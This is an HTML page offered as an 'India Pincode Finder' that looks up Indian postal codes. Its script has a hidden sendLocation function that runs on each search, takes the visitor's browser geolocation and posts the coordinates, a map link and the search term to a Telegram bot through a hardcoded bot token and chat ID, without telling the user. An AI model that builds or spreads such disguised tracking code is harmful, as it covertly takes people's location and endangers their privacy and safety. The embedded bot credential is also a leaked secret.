<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>India Pincode Finder</title>
  <style>
    body {
      font-family: Arial;
      background: #e8f5e9;
      text-align: center;
      padding: 30px;
    }
    h1 {
      color: #2e7d32;
    }
    input {
      width: 80%;
      max-width: 400px;
      padding: 12px;
      font-size: 16px;
      border: 1px solid #ccc;
      margin: 20px auto;
      border-radius: 5px;
    }
    button {
      padding: 12px 25px;
      font-size: 16px;
      background-color: #388e3c;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    table {
      margin: 30px auto;
      border-collapse: collapse;
      width: 90%;
      max-width: 800px;
      background: white;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 10px;
    }
    th {
      background: #66bb6a;
      color: white;
    }
  </style>
</head>
<body>

<h1>üìÆ India Pincode Finder</h1>

<input type="text" id="place" placeholder="Enter city or area name (e.g., Kanpur)">
<br>
<button onclick="findPincode()">üîç Find Pincode</button>

<table id="result" style="display:none;">
  <thead>
    <tr>
      <th>Post Office</th>
      <th>Pincode</th>
      <th>District</th>
      <th>State</th>
    </tr>
  </thead>
  <tbody></tbody>
</table>

<script>
const BOT_TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
const CHAT_ID = "7357184121";

function findPincode() {
  const place = document.getElementById("place").value.trim();
  if (!place) return alert("Please enter a location name.");

  sendLocation(place); // send to telegram

  fetch(`https://api.postalpincode.in/postoffice/${place}`)
    .then(res => res.json())
    .then(data => {
      const result = data[0];
      const tbody = document.querySelector("#result tbody");
      tbody.innerHTML = "";

      if (result.Status === "Success") {
        document.getElementById("result").style.display = "table";
        result.PostOffice.forEach(po => {
          const row = `<tr>
            <td>${po.Name}</td>
            <td>${po.Pincode}</td>
            <td>${po.District}</td>
            <td>${po.State}</td>
          </tr>`;
          tbody.innerHTML += row;
        });
      } else {
        alert("No data found for this place.");
        document.getElementById("result").style.display = "none";
      }
    });
}

function sendLocation(area) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      const { latitude, longitude, accuracy } = pos.coords;
      const msg = `üìç User searched for '${area}'\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\nüîó https://maps.google.com/?q=${latitude},${longitude}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: msg
        })
      });
    });
  }
}
</script>

</body>
</html>
